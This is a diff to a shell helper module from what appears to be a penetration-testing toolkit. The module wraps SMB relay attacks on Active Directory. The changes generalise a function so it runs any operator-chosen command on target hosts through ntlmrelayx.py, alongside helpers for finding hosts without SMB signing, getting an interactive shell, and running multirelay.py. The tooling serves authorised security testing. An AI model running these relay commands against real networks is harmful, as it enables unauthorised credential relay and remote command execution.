@@ -15,10 +15,10 @@ Commands
 --------
 nb-ad-smb-relay-install              installs dependencies
 nb-ad-smb-relay-enum                 identify hosts without smb signing
-nb-ad-smb-relay-ntlmrelay            replay the SMB requests
+nb-ad-smb-relay-ntlmrelay            relay the captured SMB requests (from nb-smb-enum-responder)
 nb-ad-smb-relay-ntlmrelay-shell      get interactive shell
-nb-ad-smb-relay-ntlmrelay-whoami     execute a whoami shell command on a target host using ntlmrelayx.py
-nb-ad-smb-relay-multirelay-command   execute a shell command on a target host using multirelay.py
+nb-ad-smb-relay-ntlmrelay-command    execute a shell command on a target host using ntlmrelayx.py
+nb-ad-smb-relay-multirelay-command   responder's alternative to ntlmrelayx.py - execute a shell command on a target host
 
 DOC
 }
@@ -51,12 +51,13 @@ nb-ad-smb-relay-ntlmrelay-shell() {
     print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee $(domadpath)/ntlmrelayx-shell.txt"
 }
 
-nb-ad-smb-relay-ntlmrelay-whoami() {
+nb-ad-smb-relay-ntlmrelay-command() {
     __check-project
 	  __ask "Enter a targets list file"
 	  local targets && __askvar targets TARGETS
+	  local cm && __askvar cm COMMAND
 
-	  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c 'whoami' | tee $(domadpath)/ntlmrelayx-whoami.txt"
+	  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c '$cm' | tee $(domadpath)/ntlmrelayx-command.txt"
 }
 
 nb-ad-smb-relay-multirelay-command() {
